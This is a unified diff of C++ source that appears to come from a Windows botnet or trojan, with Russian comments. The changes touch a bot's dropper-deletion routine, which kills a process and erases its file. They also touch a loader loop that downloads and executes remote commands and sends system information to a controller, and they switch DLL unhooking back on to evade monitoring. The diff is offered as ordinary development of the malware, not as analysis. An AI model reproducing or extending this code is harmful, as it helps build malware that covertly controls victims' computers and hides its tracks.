@@ -20,7 +20,7 @@
 
 
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 //********************** Отладочные шаблоны **********************************
 
@@ -86,39 +86,37 @@ void InternalAddToAutorun()
 }
 
 
-void DeleteDropper() // убиваем процесс, стираем файл
+BOOL DeleteDropper() // убиваем процесс, стираем файл
 {
-	
+	BOOL Result = FALSE;
 	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
 	{
-		MDBG("Main", "Удаляем дропер");
+		
 		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
 		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
-		pDeleteFileW(FileToDelete);
+		Result = (BOOL)pDeleteFileW(FileToDelete);
+		MDBG("Main", "Удаляем дропер %LS [Result=%d]", FileToDelete, Result);
 	}
+	return Result;
 }
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
 	
-	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());
+	MDBG("Main", "TestLoaderRoutine ");
 
-	//UnhookDlls();
+	UnhookDlls();
 
-	// BOT::Protect(NULL);
 
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
-
 
 	bool FirstSended = false;
 
 	if (InitializeTaskManager(NULL, true))
 	{
-		MDBG("Main", "=====>> Стартуем выполнение команд");
-
-		while (true)
+		for (int i = 1; i <= 1; i++)
 		{
 
 			DownloadAndExecuteCommand(NULL, NULL);
@@ -131,17 +129,12 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 				MDBG("Main", "=====>> Отправляем информацию о системе");
 				FirstSended = SendFirstInfo();
 			}
-
-			// Приостанавливаем выполнение команд
-			if (!TaskManagerSleep(NULL))
-				break;
 		}
 
     }
 	pExitProcess(0);
 	return 0;
 }
-
 
 void ExplorerMain()
 {
@@ -171,8 +164,9 @@ void ExplorerMain()
 //	HookZwQueryDirectoryFile();
 
 	// Входим в бесконечный цикл работы 
-	while (1) pSleep(INFINITE);
 }
+
+
 
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
@@ -199,9 +193,10 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 }
 
 
+
 int APIENTRY MyMain() 
 {
-	BOT::Initialize();  
+	BOT::Initialize(); 
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
@@ -219,7 +214,7 @@ int APIENTRY MyMain()
 	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
 
 
-	//UnhookDlls(); //снимаем хуки
+	UnhookDlls(); //снимаем хуки
 
 	WCHAR ModulePath[MAX_PATH];
 
